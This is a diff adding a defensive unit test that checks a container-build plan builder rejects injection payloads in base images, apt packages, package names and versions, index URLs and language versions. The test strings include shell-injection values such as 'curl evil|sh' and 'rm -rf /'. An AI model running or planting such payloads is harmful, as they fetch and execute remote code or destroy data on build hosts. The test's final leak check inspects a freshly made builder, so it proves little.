@@ -176,4 +176,36 @@ describe("BuildBuilder", () => {
     expect(plan.build.venvVolume).toBe(true);
     expect(plan.build.vendorVolume).toBe(true);
   });
+
+  it("rejects injection payloads at builder boundaries", () => {
+    const { builder } = makeBuilder();
+
+    // Base images reach the generated FROM line.
+    expect(() => builder.setBaseImage("debian:12\nRUN curl evil|sh")).toThrow(
+      /must not contain control characters/,
+    );
+    expect(() => builder.setBaseImage("img; rm -rf /")).toThrow(/must be an image reference/);
+
+    // Apt packages reach an install continuation line.
+    expect(() => builder.addAptPackage("curl wget")).toThrow(/must match/);
+    expect(() => builder.addAptPackage("pkg;id")).toThrow(/must match/);
+
+    // Package names and versions are interpolated into RUN commands.
+    expect(() => builder.addPackage("npm", "left-pad; id", {})).toThrow(/without shell characters/);
+    expect(() => builder.addPackage("npm", "left-pad", { version: "1.0; id" })).toThrow(
+      /shell characters/,
+    );
+    expect(() => builder.addPackage("pip", "requests", { indexUrl: "https://x/`id`" })).toThrow(
+      /index URL/,
+    );
+
+    // Language versions reach both image tags and RUN commands.
+    expect(() => builder.addLanguage("python", { version: "3.12; curl evil|sh" })).toThrow(
+      /version.*no shell characters|version.*must match/,
+    );
+
+    // Nothing from the rejected calls leaked into the plan.
+    const { plan } = makeBuilder();
+    expect(plan.build.baseImage).toBe("");
+  });
 });
